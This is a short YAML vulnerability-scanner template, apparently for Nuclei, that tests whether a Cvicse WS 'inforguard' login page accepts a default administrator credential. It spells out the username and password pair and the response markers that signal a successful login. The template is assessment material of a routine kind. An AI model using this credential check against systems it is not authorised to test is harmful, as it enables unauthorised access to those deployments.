id: wsmc-default-login

info:
  name: Cvicse ws Default Login  #名称
  author: ws          #作者
  severity: high      #危险等级
  description: Default login credentials were discovered for a cvicse-wsmc. #说明
  classification:       #分类
    cwe-id: CWE-798     #模板的CWE-ID
  metadata:             #元数据
    max-request: 1      #自定义条目
  tags: cvicse-ws,default-login   #tag

http:
  - raw:
      - |
        GET /inforguard/#/login HTTP/1.1
        Host: {{Hostname}}

        {"username":"{{username}}","password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - Admin@ws123

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "/menu.gch"
        part: header

